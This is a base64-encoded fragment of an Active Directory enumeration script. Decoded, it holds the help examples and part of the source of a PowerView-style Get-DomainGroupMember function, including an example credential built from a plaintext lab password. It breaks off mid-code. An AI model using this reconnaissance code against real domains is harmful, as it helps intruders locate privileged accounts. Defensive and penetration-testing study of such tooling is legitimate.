3RsYWIubG9jYWwKR3JvdXBOYW1lICAgICAgICAgICAgICAgOiBUZXN0aW5nIEdyb3VwCkdyb3VwRGlzdGluZ3Vpc2hlZE5hbWUgIDogQ049VGVzdGluZyBHcm91cCxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCk1lbWJlckRvbWFpbiAgICAgICAgICAgIDogdGVzdGxhYi5sb2NhbApNZW1iZXJOYW1lICAgICAgICAgICAgICA6IGhhcm1qMHkKTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUgOiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKTWVtYmVyT2JqZWN0Q2xhc3MgICAgICAgOiB1c2VyCk1lbWJlclNJRCAgICAgICAgICAgICAgIDogUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4CgpHcm91cERvbWFpbiAgICAgICAgICAgICA6IHRlc3RsYWIubG9jYWwKR3JvdXBOYW1lICAgICAgICAgICAgICAgOiBEZXNrdG9wIEFkbWlucwpHcm91cERpc3Rpbmd1aXNoZWROYW1lICA6IENOPURlc2t0b3AgQWRtaW5zLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKTWVtYmVyRG9tYWluICAgICAgICAgICAgOiB0ZXN0bGFiLmxvY2FsCk1lbWJlck5hbWUgICAgICAgICAgICAgIDogYXJvYmJpbnMuYQpNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZSA6IENOPUFuZHkgUm9iYmlucyAoYWRtaW4pLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKTWVtYmVyT2JqZWN0Q2xhc3MgICAgICAgOiB1c2VyCk1lbWJlclNJRCAgICAgICAgICAgICAgIDogUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTEyCgouRVhBTVBMRQoKR2V0LURvbWFpbkdyb3VwTWVtYmVyIC1Eb21haW4gdGVzdGxhYi5sb2NhbCAtSWRlbnRpdHkgJ0Rlc2t0b3AgQWRtaW5zJyAtUmVjdXJzZVVpbmdNYXRjaGluZ1J1bGUKCkdyb3VwRG9tYWluICAgICAgICAgICAgIDogdGVzdGxhYi5sb2NhbApHcm91cE5hbWUgICAgICAgICAgICAgICA6IERlc2t0b3AgQWRtaW5zCkdyb3VwRGlzdGluZ3Vpc2hlZE5hbWUgIDogQ049RGVza3RvcCBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJEb21haW4gICAgICAgICAgICA6IHRlc3RsYWIubG9jYWwKTWVtYmVyTmFtZSAgICAgICAgICAgICAgOiBoYXJtajB5Ck1lbWJlckRpc3Rpbmd1aXNoZWROYW1lIDogQ049aGFybWoweSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCk1lbWJlck9iamVjdENsYXNzICAgICAgIDogdXNlcgpNZW1iZXJTSUQgICAgICAgICAgICAgICA6IFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOAoKR3JvdXBEb21haW4gICAgICAgICAgICAgOiB0ZXN0bGFiLmxvY2FsCkdyb3VwTmFtZSAgICAgICAgICAgICAgIDogRGVza3RvcCBBZG1pbnMKR3JvdXBEaXN0aW5ndWlzaGVkTmFtZSAgOiBDTj1EZXNrdG9wIEFkbWlucyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCk1lbWJlckRvbWFpbiAgICAgICAgICAgIDogdGVzdGxhYi5sb2NhbApNZW1iZXJOYW1lICAgICAgICAgICAgICA6IGFyb2JiaW5zLmEKTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUgOiBDTj1BbmR5IFJvYmJpbnMgKGFkbWluKSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCk1lbWJlck9iamVjdENsYXNzICAgICAgIDogdXNlcgpNZW1iZXJTSUQgICAgICAgICAgICAgICA6IFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTExMgoKLkVYQU1QTEUKCkdldC1Eb21haW5Hcm91cCAqYWRtaW4qIC1Qcm9wZXJ0aWVzIHNhbWFjY291bnRuYW1lIHwgR2V0LURvbWFpbkdyb3VwTWVtYmVyCgouRVhBTVBMRQoKJ0NOPUVudGVycHJpc2UgQWRtaW5zLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwnLCAnRG9tYWluIEFkbWlucycgfCBHZXQtRG9tYWluR3JvdXBNZW1iZXIKCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluR3JvdXBNZW1iZXIgLUNyZWRlbnRpYWwgJENyZWQgLUlkZW50aXR5ICdEb21haW4gQWRtaW5zJwoKLkVYQU1QTEUKCkdldC1Eb21haW4gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmQgbmFtZQp0ZXN0bGFiLmxvY2FsCgonZGV2XGRvbWFpbiBhZG1pbnMnIHwgR2V0LURvbWFpbkdyb3VwTWVtYmVyIC1WZXJib3NlClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpbkdyb3VwTWVtYmVyXSBFeHRyYWN0ZWQgZG9tYWluICdkZXYudGVzdGxhYi5sb2NhbCcgZnJvbSAnZGV2XGRvbWFpbiBhZG1pbnMnClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gR2V0LURvbWFpbkdyb3VwTWVtYmVyIGZpbHRlciBzdHJpbmc6ICgmKG9iamVjdENhdGVnb3J5PWdyb3VwKSh8KHNhbUFjY291bnROYW1lPWRvbWFpbiBhZG1pbnMpKSkKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpbk9iamVjdF0gR2V0LURvbWFpbk9iamVjdCBmaWx0ZXIgc3RyaW5nOiAoJih8KGRpc3Rpbmd1aXNoZWRuYW1lPUNOPXVzZXIxLENOPVVzZXJzLERDPWRldixEQz10ZXN0bGFiLERDPWxvY2FsKSkpCgpHcm91cERvbWFpbiAgICAgICAgICAgICA6IGRldi50ZXN0bGFiLmxvY2FsCkdyb3VwTmFtZSAgICAgICAgICAgICAgIDogRG9tYWluIEFkbWlucwpHcm91cERpc3Rpbmd1aXNoZWROYW1lICA6IENOPURvbWFpbiBBZG1pbnMsQ049VXNlcnMsREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwKTWVtYmVyRG9tYWluICAgICAgICAgICAgOiBkZXYudGVzdGxhYi5sb2NhbApNZW1iZXJOYW1lICAgICAgICAgICAgICA6IHVzZXIxCk1lbWJlckRpc3Rpbmd1aXNoZWROYW1lIDogQ049dXNlcjEsQ049VXNlcnMsREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwKTWVtYmVyT2JqZWN0Q2xhc3MgICAgICAgOiB1c2VyCk1lbWJlclNJRCAgICAgICAgICAgICAgIDogUy0xLTUtMjEtMzM5MDQ4NjcwLTEyMzM1NjgxMDgtNDE0MTUxODY5MC0yMDExMDgKClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5PYmplY3RdIEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzogKCYofChkaXN0aW5ndWlzaGVkbmFtZT1DTj1BZG1pbmlzdHJhdG9yLENOPVVzZXJzLERDPWRldixEQz10ZXN0bGFiLERDPWxvY2FsKSkpCkdyb3VwRG9tYWluICAgICAgICAgICAgIDogZGV2LnRlc3RsYWIubG9jYWwKR3JvdXBOYW1lICAgICAgICAgICAgICAgOiBEb21haW4gQWRtaW5zCkdyb3VwRGlzdGluZ3Vpc2hlZE5hbWUgIDogQ049RG9tYWluIEFkbWlucyxDTj1Vc2VycyxEQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJEb21haW4gICAgICAgICAgICA6IGRldi50ZXN0bGFiLmxvY2FsCk1lbWJlck5hbWUgICAgICAgICAgICAgIDogQWRtaW5pc3RyYXRvcgpNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZSA6IENOPUFkbWluaXN0cmF0b3IsQ049VXNlcnMsREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwKTWVtYmVyT2JqZWN0Q2xhc3MgICAgICAgOiB1c2VyCk1lbWJlclNJRCAgICAgICAgICAgICAgIDogUy0xLTUtMjEtMzM5MDQ4NjcwLTEyMzM1NjgxMDgtNDE0MTUxODY5MC01MDAKCi5PVVRQVVRTCgpQb3dlclZpZXcuR3JvdXBNZW1iZXIKCkN1c3RvbSBQU09iamVjdCB3aXRoIHRyYW5zbGF0ZWQgZ3JvdXAgbWVtYmVyIHByb3BlcnR5IGZpZWxkcy4KCi5MSU5LCgpodHRwOi8vd3d3LnBvd2Vyc2hlbGxtYWdhemluZS5jb20vMjAxMy8wNS8yMy9wc3RpcC1yZXRyaWV2ZS1ncm91cC1tZW1iZXJzaGlwLW9mLWFuLWFjdGl2ZS1kaXJlY3RvcnktZ3JvdXAtcmVjdXJzaXZlbHkvCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZURlY2xhcmVkVmFyc01vcmVUaGFuQXNzaWdubWVudHMnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3Lkdyb3VwTWVtYmVyJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdOb25lJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJywgJ01lbWJlckRpc3Rpbmd1aXNoZWROYW1lJywgJ01lbWJlck5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ01hbnVhbFJlY3Vyc2UnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZWN1cnNlLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnUmVjdXJzZVVzaW5nTWF0Y2hpbmdSdWxlJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmVjdXJzZVVzaW5nTWF0Y2hpbmdSdWxlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ21lbWJlcixzYW1hY2NvdW50bmFtZSxkaXN0aW5ndWlzaGVkbmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICRBRE5hbWVBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQUROYW1lQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRBRE5hbWVBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRBRE5hbWVBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAkR3JvdXBTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICBpZiAoJEdyb3VwU2VhcmNoZXIpIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVjdXJzZVVzaW5nTWF0Y2hpbmdSdWxlJ10pIHsKICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eQogICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydSYXcnXSA9ICRUcnVlCiAgICAgICAgICAgICAgICAkR3JvdXAgPSBHZXQtRG9tYWluR3JvdXAgQFNlYXJjaGVyQXJndW1lbnRzCgogICAgICAgICAgICAgICAgaWYgKC1ub3QgJEdyb3VwKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3Igc2VhcmNoaW5nIGZvciBncm91cCB3aXRoIGlkZW50aXR5OiAkSWRlbnRpdHkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZE5hbWUgPSAkR3JvdXAucHJvcGVydGllcy5pdGVtKCdzYW1hY2NvdW50bmFtZScpWzBdCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwRm91bmRETiA9ICRHcm91cC5wcm9wZXJ0aWVzLml0ZW0oJ2Rpc3Rpbmd1aXNoZWRuYW1lJylbMF0KCiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwRm91bmREb21haW4gPSAkRG9tYWluCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAjIGlmIGEgZG9tYWluIGlzbid0IHBhc3NlZCwgdHJ5IHRvIGV4dHJhY3QgaXQgZnJvbSB0aGUgZm91bmQgZ3JvdXAgZGlzdGluZ3Vpc2hlZCBuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkR3JvdXBGb3VuZEROKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZERvbWFpbiA9ICRHcm91cEZvdW5kRE4uU3ViU3RyaW5nKCRHcm91cEZvdW5kRE4uSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwTWVtYmVyXSBVc2luZyBMREFQIG1hdGNoaW5nIHJ1bGUgdG8gcmVjdXJzZSBvbiAnJEdyb3VwRm91bmRETicsIG9ubHkgdXNlciBhY2NvdW50cyB3aWxsIGJlIHJldHVybmVkLiIKICAgICAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlci5maWx0ZXIgPSAiKCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KShtZW1iZXJvZjoxLjIuODQwLjExMzU1Ni4xLjQuMTk0MTo9JEdyb3VwRm91bmRETikpIgogICAgICAgICAgICAgICAgICAgICRHcm91cFNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCdkaXN0aW5ndWlzaGVkTmFtZScpKQogICAgICAgICAgICAgICAgICAgICRNZW1iZXJzID0gJEdyb3VwU2VhcmNoZXIuRmluZEFsbCgpIHwgRm9yRWFjaC1PYmplY3QgeyRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWVbMF19CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkTnVsbCA9ICRTZWFyY2hlckFyZ3VtZW50cy5SZW1vdmUoJ1JhdycpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgPSAnJwogICAgICAgICAgICAgICAgJEZpbHRlciA9ICcnCiAgICAgICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlJbnN0YW5jZSA9ICRfLlJlcGxhY2UoJygnLCAnXDI4JykuUmVwbGFjZSgnKScsICdcMjknKQogICAgICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15TLTEtJykgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RzaWQ9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXkNOPScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgLWFuZCAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgYSAtRG9tYWluIGlzbid0IGV4cGxpY2l0bHkgc2V0LCBleHRyYWN0IHRoZSBvYmplY3QgZG9tYWluIG91dCBvZiB0aGUgZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgICBhbmQgcmVidWlsZCB0aGUgZG9tYWluIHNlYXJjaGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR3JvdXBNZW1iZXJdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRJZGVudGl0eURvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkR3JvdXBTZWFyY2hlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluR3JvdXBNZW1iZXJdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4nIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UgLWltYXRjaCAnXlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKChbR3VpZF0kSWRlbnRpdHlJbnN0YW5jZSkuVG9CeXRlQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHsgJ1wnICsgJF8uVG9TdHJpbmcoJ1gyJykgfSkgLWpvaW4gJycKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlLkNvbnRhaW5zKCdcJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UgPSAkSWRlbnRpdHlJbnN0YW5jZS5SZXBsYWNlKCdcMjgnLCAnKCcpLlJlcGxhY2UoJ1wyOScsICcpJykgfCBDb252ZXJ0LUFETmFtZSAtT3V0cHV0VHlwZSBDYW5vbmljYWwKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBEb21haW4gPSAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoMCwgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignLycpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwTmFtZSA9ICRJZGVudGl0eUluc3RhbmNlLlNwbGl0KCdcJylbMV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKHNhbUFjY291bnROYW1lPSRHcm91cE5hbWUpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRHcm91cERvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXh0cmFjdGVkIGRvbWFpbiAnJEdyb3VwRG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5RmlsdGVyIC1hbmQgKCRJZGVudGl0eUZpbHRlci5UcmltKCkgLW5lICcnKSApIHsKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciArPSAiJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXIuZmlsdGVyID0gIigmKG9iamVjdENhdGVnb3J5PWdyb3VwKSRGaWx0ZXIpIgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm